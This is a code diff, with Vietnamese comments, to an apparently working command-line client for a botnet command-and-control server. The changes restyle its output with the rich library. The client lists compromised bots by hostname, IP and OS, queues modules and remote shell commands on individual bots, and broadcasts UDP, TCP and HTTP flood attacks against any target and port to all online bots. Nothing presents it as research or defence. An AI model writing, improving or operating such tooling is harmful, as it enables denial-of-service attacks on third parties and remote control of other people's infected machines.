@@ -12,9 +12,15 @@ Hỗ trợ các lệnh:
 
 import argparse
 import json
-import os
 import socket
 import sys
+
+from rich.console import Console
+from rich.panel import Panel
+from rich.table import Table
+from rich.text import Text
+
+console = Console()
 
 
 class CNCClient:
@@ -45,19 +51,41 @@ class CNCClient:
             if resp.get("ok"):
                 bots = resp.get("data", [])
                 if not bots:
-                    print("(no bots connected)")
+                    console.print("[dim](no bots connected)[/dim]")
                     return
-                print(f"{'ID':<5} {'OS':<20} {'Arch':<10} {'Hostname':<20} {'IP':<18} {'Status':<8}")
-                print("-" * 85)
+
+                table = Table(
+                    title="Bot List",
+                    title_style="bold cyan",
+                    border_style="blue",
+                )
+                table.add_column("ID", style="dim", width=5)
+                table.add_column("OS", width=22)
+                table.add_column("Arch", width=10)
+                table.add_column("Hostname", width=20)
+                table.add_column("IP", width=18)
+                table.add_column("Status", width=8)
+
                 for b in bots:
-                    os_str = f"{b.get('os','')} {b.get('os_version','')}".strip()
-                    print(f"{b['id']:<5} {os_str:<20} {b.get('arch',''):<10} {b.get('hostname',''):<20} {b.get('ip',''):<18} {b.get('status',''):<8}")
+                    os_str = f"{b.get('os', '')} {b.get('os_version', '')}".strip()
+                    status = b.get("status", "")
+                    status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"
+                    table.add_row(
+                        str(b["id"]),
+                        os_str,
+                        b.get("arch", ""),
+                        b.get("hostname", ""),
+                        b.get("ip", ""),
+                        status_style,
+                    )
+
+                console.print(table)
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except ConnectionRefusedError:
-            print("CNC server not running (connection refused)")
+            console.print("[bold red]CNC server not running (connection refused)[/bold red]")
         except OSError as e:
-            print(f"Connection error: {e}")
+            console.print(f"[bold red]Connection error:[/bold red] {e}")
 
     def bots_count(self):
         try:
@@ -66,14 +94,25 @@ class CNCClient:
             sock.close()
             if resp.get("ok"):
                 d = resp["data"]
-                print(f"Total: {d['total']} | Online: {d['online']} | Offline: {d['offline']}")
+                text = Text()
+                text.append("Total: ", style="bold")
+                text.append(f"{d['total']}  ")
+                text.append("Online: ", style="bold green")
+                text.append(f"{d['online']}  ")
+                text.append("Offline: ", style="bold red")
+                text.append(f"{d['offline']}")
+
+                console.print(Panel(text, title="Bot Statistics", border_style="blue"))
+
                 if d.get("by_os"):
-                    parts = [f"{os_name}: {count}" for os_name, count in d["by_os"]]
-                    print(" | ".join(parts))
+                    os_table = Table(show_header=False, box=None, padding=(0, 2))
+                    for os_name, count in d["by_os"]:
+                        os_table.add_row(f"[cyan]{os_name}[/cyan]", f"[bold]{count}[/bold]")
+                    console.print(os_table)
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except (ConnectionRefusedError, OSError):
-            print("CNC server not running")
+            console.print("[bold red]CNC server not running[/bold red]")
 
     def bot_info(self, bot_id: str):
         try:
@@ -82,21 +121,26 @@ class CNCClient:
             sock.close()
             if resp.get("ok"):
                 b = resp["data"]
-                print(f"  ID:         {b['id']}")
-                print(f"  Bot ID:     {b['bot_id']}")
-                print(f"  OS:         {b.get('os','')} {b.get('os_version','')}".strip())
-                print(f"  Arch:       {b.get('arch','')}")
-                print(f"  Kernel:     {b.get('kernel','')}")
-                print(f"  Hostname:   {b.get('hostname','')}")
-                print(f"  IP:         {b.get('ip','')}")
-                print(f"  Status:     {b.get('status','')}")
-                print(f"  Session:    {b.get('session_id','')}")
-                print(f"  First seen: {_ts_to_str(b.get('first_seen'))}")
-                print(f"  Last seen:  {_ts_to_str(b.get('last_seen'))}")
+                status = b.get("status", "")
+                status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"
+
+                info = Text()
+                info.append(f"  Bot ID:      {b['bot_id']}\n")
+                info.append(f"  OS:          {b.get('os', '')} {b.get('os_version', '')}\n".strip())
+                info.append(f"  Arch:        {b.get('arch', '')}\n")
+                info.append(f"  Kernel:      {b.get('kernel', '')}\n")
+                info.append(f"  Hostname:    {b.get('hostname', '')}\n")
+                info.append(f"  IP:          {b.get('ip', '')}\n")
+                info.append(f"  Status:      {status_style}\n")
+                info.append(f"  Session:     {b.get('session_id', '')}\n")
+                info.append(f"  First seen:  {_ts_to_str(b.get('first_seen'))}\n")
+                info.append(f"  Last seen:   {_ts_to_str(b.get('last_seen'))}\n")
+
+                console.print(Panel(info, title=f"Bot #{b['id']}", border_style="blue"))
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except (ConnectionRefusedError, OSError):
-            print("CNC server not running")
+            console.print("[bold red]CNC server not running[/bold red]")
 
     def cmd_send(self, bot_id: str, module: str, params: dict):
         try:
@@ -104,11 +148,11 @@ class CNCClient:
             resp = self._send(sock, {"action": "cmd_send", "bot_id": bot_id, "module": module, "params": params})
             sock.close()
             if resp.get("ok"):
-                print(f"Command queued: {resp['cmd_id']}")
+                console.print(f"[bold green]Command queued:[/bold green] [cyan]{resp['cmd_id']}[/cyan]")
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except (ConnectionRefusedError, OSError):
-            print("CNC server not running")
+            console.print("[bold red]CNC server not running[/bold red]")
 
     def cmd_status(self, cmd_id: str):
         try:
@@ -117,55 +161,71 @@ class CNCClient:
             sock.close()
             if resp.get("ok"):
                 c = resp["data"]
-                print(f"  Cmd ID:    {c['id']}")
-                print(f"  Bot:       {c['bot_id']}")
-                print(f"  Module:    {c['module']}")
-                print(f"  Params:    {c['params']}")
-                print(f"  Exit code: {c['exit_code']}")
-                print(f"  Created:   {_ts_to_str(c.get('created_at'))}")
-                print(f"  Completed: {_ts_to_str(c.get('completed_at'))}")
-                print(f"  Output:")
-                print(c.get('output', '(no output)'))
+                exit_code = c.get("exit_code", -1)
+                exit_style = "[green]" if exit_code == 0 else "[yellow]" if exit_code == -1 else "[red]"
+
+                info = Text()
+                info.append(f"  Cmd ID:    {c['id']}\n")
+                info.append(f"  Bot:       {c['bot_id']}\n")
+                info.append(f"  Module:    {c['module']}\n")
+                info.append(f"  Params:    {c['params']}\n")
+                info.append(f"  Exit code: {exit_style}{exit_code}[/]\n")
+                info.append(f"  Created:   {_ts_to_str(c.get('created_at'))}\n")
+                info.append(f"  Completed: {_ts_to_str(c.get('completed_at'))}\n")
+
+                console.print(Panel(info, title=f"Command {c['id']}", border_style="blue"))
+
+                output = c.get("output", "")
+                if output:
+                    console.print(Panel(output.strip(), title="Output", border_style="green"))
+                else:
+                    console.print("[dim](no output yet)[/dim]")
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except (ConnectionRefusedError, OSError):
-            print("CNC server not running")
+            console.print("[bold red]CNC server not running[/bold red]")
 
     def ping(self):
         try:
             sock = self._connect()
             resp = self._send(sock, {"action": "ping"})
             sock.close()
-            print("CNC server: " + ("ONLINE" if resp.get("ok") else "ERROR"))
+            if resp.get("ok"):
+                console.print("[bold green]CNC server: ONLINE[/bold green]")
+            else:
+                console.print("[bold red]CNC server: ERROR[/bold red]")
         except (ConnectionRefusedError, OSError):
-            print("CNC server: OFFLINE")
+            console.print("[bold red]CNC server: OFFLINE[/bold red]")
 
     def broadcast(self, module: str, params: dict):
-        """Gửi lệnh tới TẤT CẢ bot online."""
         try:
             sock = self._connect()
             resp = self._send(sock, {"action": "cmd_broadcast", "module": module, "params": params})
             sock.close()
             if resp.get("ok"):
                 count = resp.get("sent_to", 0)
-                print(f"Broadcast '{module}' to {count} bot(s)")
-                if count == 0:
-                    print("(no online bots)")
+                if count > 0:
+                    console.print(
+                        f"[bold green]Broadcast[/bold green] '[cyan]{module}[/cyan]' "
+                        f"to [bold]{count}[/bold] bot(s)"
+                    )
+                else:
+                    console.print(f"[yellow]Broadcast: no online bots to receive '{module}'[/yellow]")
             else:
-                print(f"Error: {resp.get('error')}")
+                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
         except (ConnectionRefusedError, OSError):
-            print("CNC server not running")
+            console.print("[bold red]CNC server not running[/bold red]")
 
 
 def _ts_to_str(ts) -> str:
     if ts is None:
         return "N/A"
     from datetime import datetime
+
     return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
 
 
 def parse_params(args: list[str]) -> dict:
-    """Parse key=value pairs từ command line args."""
     params = {}
     for a in args:
         if "=" in a:
@@ -178,20 +238,19 @@ def parse_params(args: list[str]) -> dict:
 
 def main():
     parser = argparse.ArgumentParser(description="CNC CLI")
-    parser.add_argument("--host", "-H", default="127.0.0.1", help="CNC server host (default: 127.0.0.1)")
-    parser.add_argument("--port", "-p", type=int, default=8444, help="CNC CLI port (default: 8444)")
+    parser.add_argument("--host", "-H", default="127.0.0.1", help="CNC server host")
+    parser.add_argument("--port", "-p", type=int, default=8444, help="CNC CLI port")
     parser.add_argument("command", nargs="*", help="CLI command (optional, interactive if omitted)")
     args = parser.parse_args()
 
     client = CNCClient(args.host, args.port)
 
     if not args.command:
-        # Interactive mode
-        print("CNC CLI — type 'help' for commands, 'exit' to quit")
+        console.print("[bold cyan]CNC CLI[/bold cyan] — type [bold]help[/bold] for commands, [bold]exit[/bold] to quit")
         try:
             while True:
                 try:
-                    line = input("[CNC]> ").strip()
+                    line = input("\033[1;36m[CNC]\033[0m> ").strip()
                 except (EOFError, KeyboardInterrupt):
                     print()
                     break
@@ -212,24 +271,34 @@ def _run_command(client: CNCClient, line: str):
         sys.exit(0)
 
     elif cmd_name == "help":
-        print("""
-Commands:
-  bots list              List all bots
-  bots count             Show bot statistics
-  bot info <id>          Show bot details
-  cmd <bot_id> <module> [key=val ...]  Send command to one bot
-  cmd status <cmd_id>    Check command result
-  udp-attack <target> <port> [threads=N] [duration=S] [size=B]
-                         UDP flood to ALL bots
-  tcp-attack <target> <port> [threads=N] [duration=S] [size=B]
-                         TCP flood to ALL bots
-  http-attack <target> <port> [threads=N] [duration=S]
-                         HTTP flood to ALL bots
-  shell <bot_id> <cmd>   Execute shell on one bot
-  ping                   Check if CNC server is online
-  help                   This help
-  exit                   Quit
-""")
+        from rich.markdown import Markdown
+
+        help_md = """\
+# CNC Commands
+
+## Monitoring
+- **bots list** — List all connected bots
+- **bots count** — Show bot statistics (total/online/offline)
+- **bot info** `<id>` — Show detailed info for one bot
+- **ping** — Check if CNC server is online
+
+## Command Dispatch
+- **cmd** `<bot_id>` `<module>` `[key=val ...]` — Send command to one bot
+- **cmd status** `<cmd_id>` — Check command result
+
+## Broadcast Attacks (all online bots)
+- **udp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
+- **tcp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
+- **http-attack** `<target>` `<port>` `[threads=N]` `[duration=S]`
+
+## Single Bot
+- **shell** `<bot_id>` `<command>` — Execute shell on one bot
+
+## Utility
+- **help** — This help
+- **exit** — Quit
+"""
+        console.print(Markdown(help_md))
 
     elif cmd_name == "bots":
         if len(parts) >= 2 and parts[1] == "count":
@@ -241,7 +310,7 @@ Commands:
         if len(parts) >= 3 and parts[1] == "info":
             client.bot_info(parts[2])
         else:
-            print("Usage: bot info <id>")
+            console.print("[yellow]Usage:[/yellow] bot info <id>")
 
     elif cmd_name == "cmd":
         if len(parts) >= 4 and parts[1] == "status":
@@ -252,14 +321,14 @@ Commands:
             params = parse_params(parts[3:])
             client.cmd_send(bot_id, module, params)
         else:
-            print("Usage: cmd <bot_id> <module> [params...]")
-            print("       cmd status <cmd_id>")
+            console.print("[yellow]Usage:[/yellow] cmd <bot_id> <module> [params...]")
+            console.print("[yellow]       [/yellow] cmd status <cmd_id>")
 
     elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
         if len(parts) < 3:
-            print(f"Usage: {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
+            console.print(f"[yellow]Usage:[/yellow] {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
             return
-        atk_type = cmd_name.split("-")[0]  # udp, tcp, http
+        atk_type = cmd_name.split("-")[0]
         params = {"type": atk_type, "target": parts[1], "port": parts[2]}
         for extra in parts[3:]:
             if "=" in extra:
@@ -271,7 +340,7 @@ Commands:
 
     elif cmd_name == "shell":
         if len(parts) < 3:
-            print("Usage: shell <bot_id> <command>")
+            console.print("[yellow]Usage:[/yellow] shell <bot_id> <command>")
             return
         client.cmd_send(parts[1], "shell", {"cmd": " ".join(parts[2:])})
 
@@ -279,7 +348,7 @@ Commands:
         client.ping()
 
     else:
-        print(f"Unknown command: {cmd_name}. Type 'help' for available commands.")
+        console.print(f"[yellow]Unknown command:[/yellow] {cmd_name}. Type [bold]help[/bold] for available commands.")
 
 
 if __name__ == "__main__":
